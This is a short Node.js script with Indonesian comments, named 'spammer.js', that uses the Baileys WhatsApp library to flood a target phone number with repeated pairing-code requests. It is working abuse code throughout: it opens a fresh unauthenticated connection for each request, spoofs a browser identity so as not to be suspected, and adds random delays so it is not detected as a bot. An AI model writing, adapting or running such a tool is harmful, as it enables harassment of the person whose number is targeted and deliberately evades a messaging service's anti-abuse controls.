// spammer.js - Core spam engine (simple version)
const { default: makeWASocket } = require('@whiskeysockets/baileys');

// Ambil parameter dari command line
const target = process.argv[2];
const jumlah = parseInt(process.argv[3]) || 50;

console.log(`🔥 Spam ${jumlah} pairing code ke ${target}`);

// Fungsi delay
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Fungsi kirim pairing code
async function sendPairingCode(nomor, index) {
    try {
        // Buat koneksi baru tiap request
        const sock = makeWASocket({
            auth: { creds: {}, keys: {} },  // Auth kosong = tanpa login
            printQRInTerminal: false,
            browser: ['Chrome', 'Linux', '']  // Random browser biar ga dicurigai
        });
        
        // Request pairing code
        const code = await sock.requestPairingCode(nomor);
        
        console.log(`✅ [${index}] Kode terkirim: ${code}`);
        
        // Putuskan koneksi
        sock.ws.close();
        return true;
    } catch (err) {
        console.log(`❌ [${index}] Gagal: ${err.message}`);
        return false;
    }
}

// Main loop
async function main() {
    let sukses = 0;
    let gagal = 0;
    
    for (let i = 1; i <= jumlah; i++) {
        const result = await sendPairingCode(target, i);
        if (result) sukses++; else gagal++;
        
        // Delay random 2-4 detik biar ga kedeteksi sebagai bot
        await delay(2000 + Math.random() * 2000);
    }
    
    console.log(`\n📊 Selesai! Sukses: ${sukses}, Gagal: ${gagal}`);
}

main();
